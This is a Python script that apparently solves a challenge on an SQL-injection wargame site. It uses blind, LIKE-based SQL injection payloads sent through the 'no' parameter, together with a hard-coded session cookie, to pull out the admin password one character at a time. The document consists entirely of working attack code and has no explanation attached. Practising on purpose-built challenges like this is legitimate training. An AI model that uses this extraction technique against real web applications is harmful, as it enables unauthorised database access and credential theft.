import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")


pw = ""
for i in range(1,10):
    for j in range(40, 128):
        payload = f'1 or no LIKE "2" and pw LIKE "{pw}{chr(j)}%"'
        response = requests.get(url, cookies=cookie, params={"no":payload})
        if "Hello admin" in response.text:
            print(j)
            pw += chr(j)
            break
        if j == 127:
            print("fin")
            break

print(pw)